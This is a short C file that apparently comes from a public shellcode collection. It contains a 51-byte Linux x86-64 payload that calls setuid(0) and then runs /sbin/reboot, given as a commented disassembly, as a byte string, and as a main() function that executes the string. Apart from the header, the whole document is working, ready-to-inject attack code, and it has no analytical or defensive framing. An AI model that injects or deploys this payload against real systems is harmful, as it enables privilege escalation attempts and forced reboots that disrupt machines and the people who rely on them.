/*
Title: Linux/x86-64 - setuid(0) & reboot - 51 bytes
Date: 2010-06-17
Tested: Archlinux x86_64 k2.6.33

Author: Jonathan Salwan
Web: http://shell-storm.org | http://twitter.com/jonathansalwan

! Database of shellcodes http://www.shell-storm.org/shellcode/


  400078:	48 31 ff             	xor    %rdi,%rdi
  40007b:	b0 69                	mov    $0x69,%al
  40007d:	0f 05                	syscall 
  40007f:	48 31 d2             	xor    %rdx,%rdx
  400082:	48 bb ff ff ff ff 62 	mov    $0x746f6f62ffffffff,%rbx
  400089:	6f 6f 74 
  40008c:	48 c1 eb 20          	shr    $0x20,%rbx
  400090:	53                   	push   %rbx
  400091:	48 bb 2f 73 62 69 6e 	mov    $0x65722f6e6962732f,%rbx
  400098:	2f 72 65 
  40009b:	53                   	push   %rbx
  40009c:	48 89 e7             	mov    %rsp,%rdi
  40009f:	48 31 c0             	xor    %rax,%rax
  4000a2:	50                   	push   %rax
  4000a3:	57                   	push   %rdi
  4000a4:	48 89 e6             	mov    %rsp,%rsi
  4000a7:	b0 3b                	mov    $0x3b,%al
  4000a9:	0f 05                	syscall
*/

#include <stdio.h>


char *sc =  "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31"
            "\xd2\x48\xbb\xff\xff\xff\xff\x62\x6f"
            "\x6f\x74\x48\xc1\xeb\x20\x53\x48\xbb"
            "\x2f\x73\x62\x69\x6e\x2f\x72\x65\x53"
            "\x48\x89\xe7\x48\x31\xc0\x50\x57\x48"
            "\x89\xe6\xb0\x3b\x0f\x05";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(sc));
        (*(void(*)()) sc)();
return 0;
}